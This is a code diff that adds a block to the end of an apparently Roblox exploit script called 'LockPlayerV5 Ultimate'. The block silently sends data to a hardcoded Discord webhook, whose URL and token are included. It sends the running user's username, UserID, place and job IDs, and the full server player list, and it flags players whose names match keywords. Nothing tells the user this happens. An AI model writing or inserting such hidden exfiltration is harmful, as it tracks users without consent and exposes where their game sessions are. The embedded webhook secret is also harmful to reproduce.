@@ -930,4 +930,81 @@ else
         warn("eror?" .. tostring(err))
     end
 end
-    
+
+-- Config
+getgenv().webhookUrl = "https://discord.com/api/webhooks/1452610875377848442/HAkBMvTa165GxqdGb9IUho9tR7cRU68oaKiv4YfKhauEyhoGr5c6uzmZOIGR_hhNnyWB"  -- webhook lu
+getgenv().scriptName = "LockPlayerV5 Ultimate"
+
+-- Risk keywords
+local riskKeywords = {"afz", "stars", "st4rs"}
+
+local function sendWebhook(embed)
+    local data = {
+        ["content"] = "@everyone",
+        ["embeds"] = {embed}
+    }
+    local json = game:GetService("HttpService"):JSONEncode(data)
+    local headers = {["Content-Type"] = "application/json"}
+    local requestFunc = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+    pcall(function()
+        requestFunc({Url = getgenv().webhookUrl, Body = json, Method = "POST", Headers = headers})
+    end)
+end
+
+-- get the player
+local function getServerPlayersList()
+    local playersList = {}
+    local count = 0
+    for _, plr in ipairs(game.Players:GetPlayers()) do
+        count = count + 1
+        local name = plr.Name
+        local display = plr.DisplayName or name
+        table.insert(playersList, string.format("%02d. %s | %s", count, name, display))
+    end
+    return table.concat(playersList, "\n"), count, game.Players.MaxPlayers
+end
+
+-- check player
+local function checkRiskUsers()
+    local riskList = {}
+    for _, plr in ipairs(game.Players:GetPlayers()) do
+        local nameLower = string.lower(plr.Name)
+        local displayLower = string.lower(plr.DisplayName or "")
+        for _, kw in ipairs(riskKeywords) do
+            if string.find(nameLower, kw) or string.find(displayLower, kw) then
+                table.insert(riskList, plr.Name .. " | Display: " .. (plr.DisplayName or "N/A"))
+            end
+        end
+    end
+    return riskList
+end
+
+-- settings
+local playerList, currentPlayers, maxPlayers = getServerPlayersList()
+local riskUsers = checkRiskUsers()
+local riskText = #riskUsers > 0 and table.concat(riskUsers, "\n") or "Tidak ditemukan"
+
+local embed = {
+    ["title"] = "🔥 **" .. getgenv().scriptName .. " Executed**",
+    ["color"] = 0xFFAA00,
+    ["fields"] = {
+        {["name"] = "👤 **Username**", ["value"] = game.Players.LocalPlayer.Name, ["inline"] = true},
+        {["name"] = "🏷️ **Display Name**", ["value"] = game.Players.LocalPlayer.DisplayName or "N/A", ["inline"] = true},
+        {["name"] = "🆔 **UserID**", ["value"] = tostring(game.Players.LocalPlayer.UserId), ["inline"] = true},
+        {["name"] = "🎮 **PlaceID**", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+        {["name"] = "🔗 **JobID**", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
+        {["name"] = "👥 **SERVER PLAYERS** (" .. currentPlayers .. "/" .. maxPlayers .. ")", ["value"] = "```" .. playerList .. "```", ["inline"] = false}
+    }
+}
+
+-- risk user
+if #riskUsers > 0 then
+    table.insert(embed.fields, {
+        ["name"] = "⚠️ **RISK USER FOUND**",
+        ["value"] = "```" .. riskText .. "```",
+        ["inline"] = false
+    })
+end
+
+-- send webhook
+sendWebhook(embed)
